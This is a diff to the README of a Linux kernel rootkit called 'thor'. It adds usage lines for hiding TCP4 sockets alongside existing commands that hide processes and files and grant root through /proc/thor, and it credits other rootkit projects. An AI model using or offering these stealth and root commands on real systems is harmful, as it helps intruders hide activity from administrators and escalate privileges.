@@ -28,16 +28,20 @@ target kernel. Or you could simply change the `Makefile`.
 ## How to Use
 
     usage:
-       echo hp PID  > /proc/thor     (hides process PID)
-       echo up PID  > /proc/thor     (unhides process PID)
-       echo upa     > /proc/thor     (unhide all PIDs)
-       echo hf FILE > /proc/thor     (hide file FILE)
-       echo uf FILE > /proc/thor     (unhide file FILE)
-       echo ufa     > /proc/thor     (unhide all files)
-       echo root    > /proc/thor     (gain root privileges)
+       echo hp PID    > /proc/thor     (hides process PID)
+       echo up PID    > /proc/thor     (unhides process PID)
+       echo upa       > /proc/thor     (unhide all PIDs)
+       echo hf FILE   > /proc/thor     (hide file FILE)
+       echo uf FILE   > /proc/thor     (unhide file FILE)
+       echo ufa       > /proc/thor     (unhide all files)
+       echo ht4s PORT > /proc/thor     (hide tcp4 socket)
+       echo ut4s PORT > /proc/thor     (unhide tcp4 socket)
+       echo ut4a      > /proc/thor     (unhide all tcp4 sockets)
+       echo root      > /proc/thor     (gain root privileges)
 
 ## Acknowledgement
 
 - [Arkadiusz "ivyl" Hiler](https://github.com/ivyl/rootkit)
 - [Morgan "mrrrgn" Phillips](https://github.com/mrrrgn/simple-rootkit)
 - [uzyszkodnik](https://github.com/uzyszkodnik/rootkit)
+- [Michael "mncoppola" Coppola] (https://github.com/mncoppola/suterusu)
